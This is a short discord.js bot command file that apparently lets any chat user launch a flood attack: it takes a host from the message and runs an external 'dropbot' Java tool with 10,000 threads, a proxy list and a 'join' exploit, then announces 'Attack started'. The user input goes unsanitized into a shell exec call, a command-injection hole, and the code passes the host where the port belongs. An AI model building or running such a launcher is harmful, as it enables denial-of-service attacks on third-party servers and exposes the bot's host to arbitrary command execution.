const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`java -jar dropbot_v2.1.jar host=${host} port=${host} proxiesFile=file.txt threads=10000 attackTime=30 exploit=join`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('❖ Attack 2021')
	.setTimestamp()
	.setDescription("**❖ Bot** \n \n ❖ Attack started to: \n ❖ for 999 seconds")
	.setFooter('© Developer Matija#3553.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['abd'],
  permLevel: 0
}

exports.help = {
  name: 'abd',
  description: 'Özel',
  usage: 'abd'
}